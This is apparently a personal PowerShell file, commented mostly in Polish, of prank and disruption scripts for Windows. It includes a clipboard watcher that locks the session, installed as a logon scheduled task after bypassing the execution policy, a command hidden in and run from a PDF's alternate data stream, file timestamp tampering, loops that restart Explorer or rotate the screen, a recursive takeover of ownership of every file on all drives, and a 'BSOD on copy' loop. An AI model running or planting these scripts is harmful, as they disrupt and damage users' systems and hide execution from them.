#It Locks the Sesion whenever user use a clipboard
$previousClipboardContent = Get-Clipboard -Format Text
while ($previousClipboardContent -eq (Get-Clipboard -Format Text)){
    
}

$currentClipboardContent = Get-Clipboard -Format Text

while (1) {
    $currentClipboardContent = Get-Clipboard -Format Text

    if ($currentClipboardContent -ne $previousClipboardContent) {
        [void](Add-Type -m '[DllImport("user32.dll")]public static extern bool LockWorkStation();' -Name "Lock" -pas)::LockWorkStation()

        $previousClipboardContent = $currentClipboardContent
    }

    Start-Sleep -Seconds 1
}

#previous script as a task
$skryptPath = @'
$previousClipboardContent = Get-Clipboard -Format Text
while ($previousClipboardContent -eq (Get-Clipboard -Format Text)) { }

$currentClipboardContent = Get-Clipboard -Format Text
while (1) {
    $currentClipboardContent = Get-Clipboard -Format Text
    if ($currentClipboardContent -ne $previousClipboardContent) {
        [void](Add-Type -m '[DllImport("user32.dll")]public static extern bool LockWorkStation();' -Name "Lock" -pas)::LockWorkStation()
        $previousClipboardContent = $currentClipboardContent
    }
    Start-Sleep -Seconds 1
}
'@
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $skryptPath
$trigger = New-ScheduledTaskTrigger -AtLogOn

Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "UruchomienieSkryptuNaStart"

#ustawienie metadanych pliku na cmdlt otwierający kalkulator
sc $home\Desktop\2022_ThreatDetectionReport_RedCanary.pdf -s Zone.Identifier @"
saps calc
"@

#wywołanie polecenia z metadanych pliku
gc $home\Desktop\2022_ThreatDetectionReport_RedCanary.pdf -s Zone.Identifier | iex

#usunięcie metadanych z pliku
gc $home\Desktop\2022_ThreatDetectionReport_RedCanary.pdf -s Zone.Identifier | ri

#wyświetlenie metadanych pliku z pulpitu
gci $home\Desktop\ | % {gc $_.FullName -ea Si -s Zone.Identifier}

#poniższy skrypt wywołuje skrypt c# tak, żeby każdorazowe otwarcie pliku powodowało zmianę daty stworzenia pliku
$csharpCode = @'
using System;
using System.IO;

public class TimeChanger
{
    public static void Changer()
    {
        string path = @"C:\Users\mzkwcim\Desktop\CzasoZmieniacz.txt";
        var creationTime = File.GetCreationTime(path);
        var timer = new System.Timers.Timer();
        timer.Interval = 3000;
        timer.Elapsed += (s, e) => {
            var lastAccess = File.GetLastAccessTime(path);
            if (lastAccess > creationTime) {
                File.SetCreationTime(path, lastAccess);
            }
        };
        timer.Start();
        while (timer.Enabled) ;
    }
}
'@

Add-Type -TypeDefinition $csharpCode -Language CSharp

[TimeChanger]::Changer()

#przeszukanie danego folderu z plikami z alternatywnym datastreamem
gci | % {gi $_.FullName -s * | where {($_.Stream | sls -N "Data")} | select filename, stream}

#theme changer as a script
while ($true){
    $k = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
    $v = (gp $k).SystemusesLightTheme -bxor 1
    sp $k "SystemusesLightTheme" $v
    sp $k "appsuselighttheme" $v
    Start-Sleep -S 1
}
#and as a twoliner
sp "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" "SystemusesLightTheme" ((gp "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize").SystemusesLightTheme -bxor 1)
sp "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" "appsuselighttheme" ((gp "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize").SystemusesLightTheme -bxor 1)

#anoying notepad script
while($true){
    saps notepad
    Start-Sleep -S 2
    kill (gps -N notepad | select -exp id)
    Start-Sleep -S 2
}

$number = 0
while ($true){
    $realnumber = $number%4
    $number += 1
    # Ścieżka rejestru dla ustawień taskbara
    $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3"

    # Pobierasz obecne ustawienia taskbara
    $taskbarSettings = Get-ItemProperty -Path $registryPath

    # Aktualne wartości
    $currentValues = $taskbarSettings.'Settings'

    # Zmieniaj konkretne wartości
    $currentValues[8] = 0x02
    $currentValues[12] = 0x0 + $realnumber #03 ustawienie paska na dole 02 ustawienie paska po prawej stronie 01 ustawienie paska u góry 00 ustawienie paska po lewej stronie
    $currentValues[16] = 0x00
    $currentValues[20] = 0x01

    # Zapisujesz zmodyfikowane wartości z powrotem do rejestru
    Set-ItemProperty -Path $registryPath -Name "Settings" -Value $currentValues
    Stop-Process -Name explorer -Force
    Start-Process explorer
    Start-Sleep -Seconds 4
}

#oneliner zmieniający pozycję kursora co 5 sekund
for(){[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Random 1920), (random 1080) ); Sleep 5}

#oneliner piszący
[System.Windows.Forms.SendKeys]::SendWait('^{ESC}'); "Weź się kurwa do roboty" | % {[System.Windows.Forms.SendKeys]::SendWait($_)}

#zmiana rotacji monitora w kółko
while ($true){
    [System.Windows.Forms.SendKeys]::SendWait('^%{LEFT}')
    [System.Windows.Forms.SendKeys]::SendWait('^%{DOWN}')
    [System.Windows.Forms.SendKeys]::SendWait('^%{RIGHT}')
    [System.Windows.Forms.SendKeys]::SendWait('^%{UP}')
}

#jw jako oneliner
for(){@('^%{LEFT}','^%{DOWN}','^%{RIGHT}','^%{UP}')|%{[System.Windows.Forms.SendKeys]::SendWait($_)}}
    
#deliting all systemfiles, allmost
(psprovider | where name -eq filesystem).drives.root | % {ls $_ -r -fo | select -exp fullname | % {$acl = get-acl $_; $acl.SetOwner([System.Security.Principal.NTAccount]::new((whoami))); Set-Acl $_ $acl;}}

#czytanie wikipedii
Add-Type -AssemblyName System.Speech;[Speech.Synthesis.SpeechSynthesizer]::new().Speak((iwr https://pl.wikipedia.org/wiki/Ptaki).content + [regex]::Escape('<td style="width: 100%;"') -replace "<.*?>")

#skrypt zmieniający lokację pliku
$directories = (gci "$home\Desktop" -r -di).FullName;for(){mi (gci "$home\Desktop" -r "example.txt").Fullname ($directories|random) -Fo;Sleep 5}

#skrypt wypisujący 6 losowych znaków
[System.Windows.Forms.SendKeys]::SendWait(([char[]] ([int][char]'a'..[int][char]'z' + [int][char]'A'..[int][char]'Z' + [int][char]'0'..[int][char]'9' + [int][char]'ą'..[int][char]'ż') | Get-Random -c 6))

#ten program robi BSOD kiedy użytkownik skopiuje tekst
$previousClipboardContent = Get-Clipboard -Format Text
while ($previousClipboardContent -eq (Get-Clipboard -Format Text)){
    
}

while (1) {
    $currentClipboardContent = Get-Clipboard -Format Text

    if ($currentClipboardContent -ne $previousClipboardContent) {
        wininit

        $previousClipboardContent = $currentClipboardContent
    }

    Start-Sleep -Seconds 1
}
